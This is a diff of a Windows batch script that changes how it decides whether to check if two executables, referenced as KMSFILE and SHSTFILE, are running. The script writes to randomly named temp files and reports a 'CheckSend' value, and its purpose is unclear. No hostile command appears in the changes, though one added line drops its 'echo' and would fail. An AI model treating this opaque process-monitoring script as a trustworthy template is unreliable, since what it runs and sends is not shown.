@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=30.6"
+set "BATCHVERSION=30.8"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
@@ -1318,13 +1318,22 @@ echo.
 echo.
 
 
-if "!KMSSTART!"=="1" if "!SHSTSTART!"=="1" (
-    echo KMSSTART=SHSTSTART=1
-    echo Going to CHECKIFRUNNING
-    goto :CHECKIFRUNNING
-)
 
-echo One of them # 1
+
+
+
+::set "SHSTSTART=0"
+set "KMSSTART=0"
+
+
+
+if "!SHSTSTART!"=="1" goto :CHECK_SHSTFILE
+if "!KMSSTART!"=="1" goto :CHECK_KMSFILE
+
+
+
+
+echo Both # 1
 echo Going to NEXT5
 goto NEXT5
 
@@ -1339,8 +1348,8 @@ echo.
 
 
 
-:CHECKIFRUNNING
 
+:CHECK_SHSTFILE
 :: Check if SHSTFILE is running
 powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' }) { exit 0 } else { exit 1 }"
 if %errorlevel%==1 (
@@ -1363,6 +1372,16 @@ echo.
 echo.
 
 
+
+
+if "!KMSSTART!"=="1" goto :CHECK_KMSFILE
+Only SHSTSTART=!SHSTSTART!
+echo Going to NEXT5
+goto NEXT5
+
+
+
+:CHECK_KMSFILE
 :: Check if KMSFILE is running
 powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%KMSFILE%' }) { exit 0 } else { exit 1 }"
 if %errorlevel%==1 (
@@ -1380,11 +1399,6 @@ echo KMS RUNNING is !KMSRUNNING! and %KMSRUNNING%
 echo.
 echo.
 echo CheckSend Now is = !CheckSend!
-
-
-
-
-
 
 
 
